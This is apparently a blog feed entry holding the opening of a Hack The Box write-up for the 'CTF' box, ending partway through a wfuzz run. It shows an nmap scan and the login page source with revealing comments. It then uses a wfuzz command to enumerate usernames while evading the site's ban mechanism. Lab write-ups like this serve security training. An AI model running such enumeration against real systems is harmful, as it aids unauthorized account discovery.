<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-25T21:05:00+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - CTF</title><link href="http://localhost:4000/hack-the-box/ctf/" rel="alternate" type="text/html" title="Hack The Box - CTF" /><published>2019-07-20T00:00:00+02:00</published><updated>2019-07-20T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/ctf</id><content type="html" xml:base="http://localhost:4000/hack-the-box/ctf/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-ctf-retired-and-heres-my-write-up-about-it-ctf-was-a-very-cool-box-it-had-an-ldap-injection-vulnerability-which-i-have-never-seen-on-another-box-before-and-the-way-of-exploiting-that-vulnerability-to-gain-access-was-great-a-really-unique-box-i-had-fun-solving-it-and-i-hope-you-have-fun-too-reading-my-write-up-its-a-linux-box-and-its-ip-is-101010122-i-added-it-to-etchosts-as-ctfhtb-lets-jump-right-in-&quot;&gt;Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.122&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;ctf.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC ctf.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ctf/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;only-http-on-port-80-and-ssh-on-port-22&quot;&gt;Only &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://ctf.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ctf/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-pretty-straightforward-that-we-will-get-banned-for-5-minutes-if-we-tried-to-bruteforce-anything-like-sub-directories-for-example-its-also-saying-that-they-handle-authentication-with-tokens-theres-a-login-page-so-lets-take-a-look-at-it&quot;&gt;It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-a-username-and-an-otp-one-time-password-an-otp-is-time-limited-which-means-that-even-if-we-could-get-a-valid-one-it-will-give-us-access-only-once-because-it-expires-in-a-short-time-usually-60-seconds-so-we-need-to-gain-access-to-a-place-that-generates-valid-otps-or-to-be-able-to-generate-valid-otps-ourselves-lets-take-a-look-at-the-source-code-of-the-login-page-maybe-something-is-there-&quot;&gt;We need a username and an &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; (one-time password). An &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s or to be able to generate valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s ourselves. Let’s take a look at the source code of the login page, maybe something is there :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;description&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;author&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/favicon.ico&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CTF login form&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Bootstrap core CSS --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/dist/css/bootstrap.min.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Custom styles for this template --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cover.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;header&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;masthead mb-auto&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inner&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;masthead-brand&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;CTF&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;nav&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav nav-masthead justify-content-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav-link active&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav-link active&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;login.php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/nav&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/header&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/login.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsername&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-2 col-form-label&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Username&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsename&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsername&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-2 col-form-label&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;OTP&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;OTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;One Time Password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;btn btn-primary  name=&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;      
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;footer&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mastfoot mt-auto text-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inner&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;CTF&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; by &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.hackthebox.eu/home/users/profile/13340&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;target=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_blank&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;0xEA31&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;. Cover template for &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://getbootstrap.com/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Bootstrap&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;, by &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://twitter.com/mdo&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;@mdo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/footer&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Bootstrap core JavaScript
    ================================================== --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Placed at the end of the document so the pages load faster --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://code.jquery.com/jquery-3.3.1.slim.min.js&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;integrity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;crossorigin=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;anonymous&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/dist/js/bootstrap.min.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;these-comments-look-interesting-&quot;&gt;These comments look interesting :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&amp;gt;
      &amp;lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-now-we-know-that-they-are-using-a-token-to-generate-the-otps-we-also-know-that-the-length-of-the-token-is-81-digits-but-i-still-couldnt-figure-out-that-part-about-the-attribute-theyre-using-to-store-the-token-i-decided-to-bruteforce-the-username-then-return-to-the-otp-thing-again&quot;&gt;So now we know that they are using a token to generate the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s, we also know that the length of the token is 81 digits. But I still couldn’t figure out that part about the attribute they’re using to store the token. I decided to bruteforce the username then return to the &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; thing again.&lt;/h4&gt;
&lt;h4 id=&quot;i-know-what-youre-thinking-how-will-i-bruteforce-the-username-without-getting-banned--well-i-tried-to-pass-any-credentials-to-see-how-will-the-application-respond-&quot;&gt;I know what you’re thinking, how will I bruteforce the username without getting banned ? Well I tried to pass any credentials to see how will the application respond :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ctf/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;here-i-noticed-2-things-first-thing-is-that-its-actually-telling-us-if-the-user-exists-or-not-which-means-that-we-can-enumerate-users-the-other-thing-is-that-it-responded-normally-with-a-200-ok-response-so-if-the-server-identifies-a-bruteforce-attack-by-monitoring-how-many-times-an-ip-causes-errors-like-404-for-example-as-long-as-we-are-not-causing-errors-we-wont-get-banned-i-gave-it-a-try-to-see-if-it-will-actually-work-i-used-wfuzz-and-multiplesources-users-fabian-fingerledetxt-from-seclists-&quot;&gt;Here I noticed 2 things. First thing is that it’s actually telling us if the user exists or not, which means that we can enumerate users. The other thing is that it responded normally with a &lt;code class=&quot;highlighter-rouge&quot;&gt;200 OK&lt;/code&gt; response, so If the server identifies a bruteforce attack by monitoring how many times an ip causes errors like &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; for example, as long as we are not causing errors we won’t get banned. I gave it a try to see if it will actually work. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; and &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;multiplesources-users-fabian-fingerle.de.txt&lt;/code&gt;&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c -u http://ctf.htb/login.php -X POST -d &quot;inputUsername=FUZZ&amp;amp;inputOTP=0000&quot; -w ./multiplesources-users-fabian-fingerle.de.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ctf.htb/login.php
Total requests: 21168

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000007:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*(&quot;
000008:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*()&quot;
000010:  C=200     68 L      229 W         2810 Ch        &quot;*****&quot;
000002:  C=200     68 L      229 W         2810 Ch        &quot;!@#&quot;
000003:  C=200     68 L      229 W         2810 Ch        &quot;!@#%&quot;
000004:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&quot;
000005:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;&quot;
000009:  C=200     68 L      233 W         2827 Ch        &quot;&quot;&quot;&quot;
000006:  C=200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;amp;*&quot;
000001:  C=200     68 L      233 W         2826 Ch        &quot;-&quot;
000011:  C=200     68 L      233 W         2826 Ch        &quot;0&quot;
000012:  C=200     68 L      233 W         2827 Ch        &quot;00&quot;
